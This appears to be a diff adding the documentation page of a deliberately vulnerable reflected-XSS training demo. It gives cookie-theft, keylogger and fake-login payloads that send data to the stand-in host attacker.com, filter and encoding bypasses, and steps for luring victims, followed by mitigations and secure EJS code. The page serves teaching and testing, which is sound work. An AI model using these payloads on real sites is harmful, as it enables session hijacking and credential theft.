@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= title %></title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #1e1e2e;
+      color: #cdd6f4;
+    }
+    .navbar {
+      background-color: #181825 !important;
+      border-bottom: 1px solid #313244;
+    }
+    .card {
+      background-color: #181825;
+      border: 1px solid #313244;
+    }
+    .card-header {
+      background-color: #11111b;
+      border-bottom: 1px solid #313244;
+    }
+    .alert-danger {
+      background-color: #f38ba8;
+      border-color: #f38ba8;
+      color: #11111b;
+    }
+    .alert-info {
+      background-color: #89b4fa;
+      border-color: #89b4fa;
+      color: #11111b;
+    }
+    .alert-warning {
+      background-color: #f9e2af;
+      border-color: #f9e2af;
+      color: #11111b;
+    }
+    code {
+      background-color: #313244;
+      color: #b4befe;
+      padding: 0.2rem 0.4rem;
+      border-radius: 3px;
+    }
+    pre {
+      background-color: #11111b;
+      border: 1px solid #313244;
+      border-radius: 6px;
+      padding: 1rem;
+      color: #cdd6f4;
+    }
+    .vulnerability-badge {
+      background-color: #f38ba8;
+      color: #11111b;
+      font-size: 0.75rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 3px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+    .severity-high {
+      background-color: #f38ba8;
+      color: #11111b;
+    }
+    .table-dark {
+      --bs-table-bg: #181825;
+      --bs-table-border-color: #313244;
+    }
+    .xss-demo {
+      background-color: #313244;
+      border: 1px solid #f38ba8;
+      border-radius: 6px;
+      padding: 1rem;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark">
+    <div class="container">
+      <a class="navbar-brand" href="/demo3">
+        XSS Demo Documentation
+      </a>
+      <div class="navbar-nav ms-auto">
+        <a class="nav-link" href="/demo3">
+          [>] Launch Demo
+        </a>
+        <a class="nav-link" href="/">← Back to Demos</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container mt-4">
+    <div class="row">
+      <div class="col-12">
+        <!-- Table of Contents -->
+        <div class="card mb-4" style="border: 2px solid #89b4fa;">
+          <div class="card-header" style="background-color: #89b4fa;">
+            <h5 class="mb-0" style="color: #11111b;">
+              <i class="bi bi-list-ul me-2"></i>Table of Contents
+            </h5>
+          </div>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-md-6">
+                <h6 class="text-primary">Core XSS Attacks</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#basic-script-injection" class="text-decoration-none">1. Basic Script Injection</a></li>
+                  <li><a href="#cookie-theft-attack" class="text-decoration-none">2. Cookie Theft Attack</a></li>
+                  <li><a href="#keylogger-attack" class="text-decoration-none">3. Keylogger Attack</a></li>
+                  <li><a href="#phishing-attack" class="text-decoration-none">4. Phishing Attack</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Advanced Techniques</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#filter-bypass-techniques" class="text-decoration-none">Filter Bypass Techniques</a></li>
+                  <li><a href="#encoding-bypasses" class="text-decoration-none">Encoding Bypasses</a></li>
+                </ul>
+              </div>
+              <div class="col-md-6">
+                <h6 class="text-primary">Real-world Impact</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#account-takeover" class="text-decoration-none">Account Takeover</a></li>
+                  <li><a href="#data-theft" class="text-decoration-none">Data Theft</a></li>
+                  <li><a href="#malware-distribution" class="text-decoration-none">Malware Distribution</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Testing & Mitigation</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#mitigation-strategies" class="text-decoration-none">Mitigation Strategies</a></li>
+                  <li><a href="#xss-testing-checklist" class="text-decoration-none">XSS Testing Checklist</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Quick Navigation</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#vulnerability-table" class="text-decoration-none">📊 Vulnerability Summary Table</a></li>
+                  <li><a href="#basic-script-injection" class="text-decoration-none">🚨 Start with Basic XSS</a></li>
+                  <li><a href="/demo3" class="text-decoration-none">🔍 Try the XSS Demo</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="card">
+          <div class="card-header">
+            <h4 class="mb-0">
+              [!] Cross-Site Scripting (XSS) Documentation
+              <span class="vulnerability-badge severity-high ms-2">High Severity</span>
+            </h4>
+          </div>
+          <div class="card-body">
+
+            <!-- Overview -->
+            <div class="alert alert-danger">
+              <h6>WARNING: Vulnerability Overview</h6>
+              <p class="mb-0">This demo demonstrates <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerabilities that allow attackers to inject malicious JavaScript code into web pages, potentially stealing cookies, session tokens, or performing actions on behalf of users.</p>
+            </div>
+
+            <!-- Vulnerability Details -->
+            <h5 class="text-primary mb-3">Vulnerability Details</h5>
+            
+            <div class="table-responsive mb-4" id="vulnerability-table">
+              <table class="table table-dark table-striped">
+                <thead>
+                  <tr>
+                    <th>Vulnerability Type</th>
+                    <th>Severity</th>
+                    <th>Impact</th>
+                    <th>Location</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Reflected XSS</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>Code execution in user's browser</td>
+                    <td><code>/demo3?name=PAYLOAD</code></td>
+                  </tr>
+                  <tr>
+                    <td>Unsafe EJS Rendering</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>HTML injection</td>
+                    <td>EJS template <code><%- %></code></td>
+                  </tr>
+                  <tr>
+                    <td>Cookie Exposure</td>
+                    <td><span class="badge bg-warning">Medium</span></td>
+                    <td>Session hijacking</td>
+                    <td>Admin session cookie</td>
+                  </tr>
+                  <tr>
+                    <td>No Input Validation</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>Malicious script execution</td>
+                    <td>Name parameter</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+            <!-- What is XSS -->
+            <h5 class="text-primary mb-3">What is Cross-Site Scripting (XSS)?</h5>
+            
+            <div class="card mb-4">
+              <div class="card-body">
+                <p><strong>Cross-Site Scripting (XSS)</strong> is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When successful, XSS can give attackers access to:</p>
+                <ul>
+                  <li><strong>Session cookies and tokens</strong> - Allowing account takeover</li>
+                  <li><strong>Sensitive page content</strong> - Including forms, personal data, etc.</li>
+                  <li><strong>User interactions</strong> - Ability to perform actions as the user</li>
+                  <li><strong>Browser capabilities</strong> - Access to geolocation, camera, etc.</li>
+                </ul>
+                
+                <h6 class="text-secondary mt-3">Types of XSS:</h6>
+                <ul>
+                  <li><strong>Reflected XSS:</strong> Payload is reflected immediately in the response (this demo)</li>
+                  <li><strong>Stored XSS:</strong> Payload is stored server-side and executed for multiple users</li>
+                  <li><strong>DOM-based XSS:</strong> Payload executes entirely in the browser's DOM</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Exploitation Guide -->
+            <h5 class="text-primary mb-3">Exploitation Guide</h5>
+
+            <!-- Basic XSS -->
+            <div class="card mb-4" id="basic-script-injection">
+              <div class="card-header">
+                <h6 class="mb-0">1. Basic Script Injection</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Vulnerability:</strong> User input is reflected directly in the HTML without encoding.</p>
+                
+                <p><strong>Basic payload:</strong></p>
+                <div class="xss-demo">
+                  <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                </div>
+
+                <p><strong>How to test:</strong></p>
+                <ol>
+                  <li>Navigate to the demo page</li>
+                  <li>Enter the payload in the name field</li>
+                  <li>Submit the form</li>
+                  <li>Observe the JavaScript alert execution</li>
+                </ol>
+
+                <p><strong>URL-based exploitation:</strong></p>
+                <pre><code>http://localhost:3000/demo3?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+
+                <div class="alert alert-info">
+                  <strong>Expected Result:</strong> JavaScript alert box appears, confirming script execution in the user's browser.
+                </div>
+              </div>
+            </div>
+
+            <!-- Cookie Theft -->
+            <div class="card mb-4" id="cookie-theft-attack">
+              <div class="card-header">
+                <h6 class="mb-0">2. Cookie Theft Attack</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Objective:</strong> Steal the victim's session cookies to impersonate them.</p>
+                
+                <p><strong>Payload:</strong></p>
+                <div class="xss-demo">
+                  <code>&lt;script&gt;document.location='http://attacker.com/steal.php?c='+document.cookie&lt;/script&gt;</code>
+                </div>
+
+                <p><strong>Image-based alternative (more stealthy):</strong></p>
+                <div class="xss-demo">
+                  <code>&lt;img src="x" onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie"&gt;</code>
+                </div>
+
+                <p><strong>Exploitation steps:</strong></p>
+                <ol>
+                  <li>Set up a cookie collection server at <code>attacker.com</code></li>
+                  <li>Craft the malicious URL with the cookie theft payload</li>
+                  <li>Send the URL to the victim (via email, social media, etc.)</li>
+                  <li>When victim clicks, their cookies are sent to attacker's server</li>
+                  <li>Attacker uses stolen cookies to impersonate the victim</li>
+                </ol>
+
+                <div class="alert alert-danger">
+                  <strong>Impact:</strong> Complete account takeover, especially dangerous with the admin session cookie set by this demo.
+                </div>
+              </div>
+            </div>
+
+            <!-- Keylogger -->
+            <div class="card mb-4" id="keylogger-attack">
+              <div class="card-header">
+                <h6 class="mb-0">3. Keylogger Attack</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Objective:</strong> Record all user keystrokes to capture passwords and sensitive data.</p>
+                
+                <p><strong>Payload:</strong></p>
+                <div class="xss-demo">
+                  <code>&lt;script&gt;document.onkeypress=function(e){new Image().src='http://attacker.com/keylog.php?k='+String.fromCharCode(e.which)}&lt;/script&gt;</code>
+                </div>
+
+                <p><strong>Advanced keylogger with buffering:</strong></p>
+                <pre><code>&lt;script&gt;
+var keys='';
+document.onkeypress=function(e){
+  keys+=String.fromCharCode(e.which);
+  if(keys.length&gt;50){
+    new Image().src='http://attacker.com/keylog.php?data='+encodeURIComponent(keys);
+    keys='';
+  }
+}
+&lt;/script&gt;</code></pre>
+
+                <div class="alert alert-info">
+                  <strong>Expected Result:</strong> All user keystrokes are captured and sent to the attacker's server in real-time.
+                </div>
+              </div>
+            </div>
+
+            <!-- Phishing -->
+            <div class="card mb-4" id="phishing-attack">
+              <div class="card-header">
+                <h6 class="mb-0">4. Phishing Attack</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Objective:</strong> Create fake login forms to steal credentials.</p>
+                
+                <p><strong>Payload:</strong></p>
+                <pre><code>&lt;script&gt;
+document.body.innerHTML='&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"&gt;&lt;h2&gt;Session Expired&lt;/h2&gt;&lt;p&gt;Please login again:&lt;/p&gt;&lt;form onsubmit="new Image().src=\\'http://attacker.com/phish.php?u=\\'+this.username.value+\\'&amp;p=\\'+this.password.value;return false;"&gt;Username: &lt;input name="username"&gt;&lt;br&gt;Password: &lt;input type="password" name="password"&gt;&lt;br&gt;&lt;input type="submit" value="Login"&gt;&lt;/form&gt;&lt;/div&gt;';
+&lt;/script&gt;</code></pre>
+
+                <p><strong>Simpler HTML injection approach:</strong></p>
+                <div class="xss-demo">
+                  <code>&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999;"&gt;HACKED!&lt;/div&gt;</code>
+                </div>
+
+                <div class="alert alert-info">
+                  <strong>Expected Result:</strong> The entire page is replaced with a fake login form that captures credentials.
+                </div>
+              </div>
+            </div>
+
+            <!-- Advanced Techniques -->
+            <h5 class="text-primary mb-3">Advanced XSS Techniques</h5>
+
+            <div class="row">
+              <div class="col-md-6">
+                <div class="card mb-3" id="filter-bypass-techniques">
+                  <div class="card-header">
+                    <h6 class="mb-0">Filter Bypass Techniques</h6>
+                  </div>
+                  <div class="card-body">
+                    <p><strong>Event handlers:</strong></p>
+                    <code>&lt;img src=x onerror=alert(1)&gt;</code><br>
+                    <code>&lt;svg onload=alert(1)&gt;</code><br>
+                    <code>&lt;body onload=alert(1)&gt;</code>
+                    
+                    <p class="mt-3"><strong>JavaScript alternatives:</strong></p>
+                    <code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code><br>
+                    <code>&lt;iframe src="javascript:alert(1)"&gt;</code>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="card mb-3" id="encoding-bypasses">
+                  <div class="card-header">
+                    <h6 class="mb-0">Encoding Bypasses</h6>
+                  </div>
+                  <div class="card-body">
+                    <p><strong>HTML encoding:</strong></p>
+                    <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>
+                    
+                    <p class="mt-3"><strong>URL encoding:</strong></p>
+                    <code>%3Cscript%3Ealert(1)%3C/script%3E</code>
+                    
+                    <p class="mt-3"><strong>Unicode encoding:</strong></p>
+                    <code>\u003cscript\u003ealert(1)\u003c/script\u003e</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Real-world Impact -->
+            <h5 class="text-primary mb-3">Real-World Attack Scenarios</h5>
+            
+            <div class="row">
+              <div class="col-md-4">
+                <div class="card mb-3" id="account-takeover">
+                  <div class="card-header">
+                    <h6 class="mb-0">Account Takeover</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[>] Steal session cookies</li>
+                      <li>[>] Capture login credentials</li>
+                      <li>[>] Bypass 2FA via session hijacking</li>
+                      <li>[>] Perform actions as victim</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="card mb-3" id="data-theft">
+                  <div class="card-header">
+                    <h6 class="mb-0">Data Theft</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[>] Extract sensitive page content</li>
+                      <li>[>] Read private messages/emails</li>
+                      <li>[>] Access internal admin pages</li>
+                      <li>[>] Steal personal information</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="card mb-3" id="malware-distribution">
+                  <div class="card-header">
+                    <h6 class="mb-0">Malware Distribution</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[>] Redirect to malicious sites</li>
+                      <li>[>] Download malware payloads</li>
+                      <li>[>] Browser exploitation</li>
+                      <li>[>] Cryptojacking scripts</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Mitigation -->
+            <h5 class="text-primary mb-3" id="mitigation-strategies">Mitigation Strategies</h5>
+            
+            <div class="alert alert-warning">
+              <h6>[!] Essential Protection Measures</h6>
+              <ul class="mb-0">
+                <li><strong>Output Encoding:</strong> Use <code>&lt;%= %&gt;</code> instead of <code>&lt;%- %&gt;</code> in EJS templates</li>
+                <li><strong>Input Validation:</strong> Validate and sanitize all user input on both client and server side</li>
+                <li><strong>Content Security Policy (CSP):</strong> Implement strict CSP headers to prevent script execution</li>
+                <li><strong>HttpOnly Cookies:</strong> Set cookies with HttpOnly flag to prevent JavaScript access</li>
+                <li><strong>Secure Cookies:</strong> Use Secure flag for HTTPS-only cookie transmission</li>
+                <li><strong>X-XSS-Protection:</strong> Enable browser XSS protection (though deprecated, still useful for old browsers)</li>
+                <li><strong>Framework Protection:</strong> Use framework-provided XSS protection features</li>
+              </ul>
+            </div>
+
+            <!-- Code Examples -->
+            <h5 class="text-primary mb-3">Secure Code Examples</h5>
+            
+            <div class="row">
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0 text-danger">[X] Vulnerable Code</h6>
+                  </div>
+                  <div class="card-body">
+                    <pre><code>// EJS Template (VULNERABLE)
+&lt;h1&gt;&lt;%- heading %&gt;&lt;/h1&gt;
+
+// Express Route (VULNERABLE)
+router.get('/demo3', (req, res) =&gt; {
+  const name = req.query.name || 'Guest';
+  res.render('demo3/index', { 
+    heading: `Hello, ${name}!` 
+  });
+});</code></pre>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0 text-success">[OK] Secure Code</h6>
+                  </div>
+                  <div class="card-body">
+                    <pre><code>// EJS Template (SECURE)
+&lt;h1&gt;&lt;%= heading %&gt;&lt;/h1&gt;
+
+// Express Route (SECURE)
+const validator = require('validator');
+router.get('/demo3', (req, res) =&gt; {
+  let name = req.query.name || 'Guest';
+  name = validator.escape(name);
+  res.render('demo3/index', { 
+    heading: `Hello, ${name}!` 
+  });
+});</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Testing Guide -->
+            <h5 class="text-primary mb-3 mt-4">Testing XSS Vulnerabilities</h5>
+            
+            <div class="card" id="xss-testing-checklist">
+              <div class="card-header">
+                <h6 class="mb-0">XSS Testing Checklist</h6>
+              </div>
+              <div class="card-body">
+                <div class="row">
+                  <div class="col-md-6">
+                    <h6>Manual Testing:</h6>
+                    <ul>
+                      <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                      <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+                      <li><code>&lt;svg onload=alert(1)&gt;</code></li>
+                      <li><code>javascript:alert(1)</code></li>
+                      <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code></li>
+                    </ul>
+                  </div>
+                  <div class="col-md-6">
+                    <h6>Automated Tools:</h6>
+                    <ul>
+                      <li>OWASP ZAP</li>
+                      <li>Burp Suite</li>
+                      <li>XSSer</li>
+                      <li>XSStrike</li>
+                      <li>Browser Developer Tools</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
